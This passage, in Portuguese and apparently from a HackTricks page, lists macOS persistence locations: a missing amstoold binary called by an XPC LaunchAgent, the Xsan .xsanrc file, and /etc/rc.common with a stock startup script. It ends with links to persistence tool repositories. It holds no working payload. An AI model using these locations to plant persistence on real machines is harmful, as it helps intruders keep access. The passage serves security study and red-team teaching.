Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)

#### Localização

- **`/usr/local/bin/amstoold`**
- Requer root

#### Descrição & Exploitation

Aparentemente o `plist` de `/System/Library/LaunchAgents/com.apple.amstoold.plist` estava usando esse binário enquanto expunha um serviço XPC... o problema é que o binário não existia, então você podia colocar algo ali e quando o serviço XPC fosse chamado seu binário seria executado.

Não consigo mais encontrar isso no meu macOS.

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)

#### Localização

- **`/Library/Preferences/Xsan/.xsanrc`**
- Requer root
- **Trigger**: Quando o serviço é executado (raramente)

#### Descrição & exploit

Aparentemente não é muito comum executar esse script e eu nem sequer o encontrei no meu macOS, então se quiser mais informações confira o writeup.

### ~~/etc/rc.common~~

> [!CAUTION] > **Isto não funciona nas versões modernas do macOS**

Também é possível colocar aqui **comandos que serão executados na inicialização.** Exemplo de um script rc.common regular:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Técnicas e ferramentas de persistência

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## Referências

- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)

{{#include ../banners/hacktricks-training.md}}
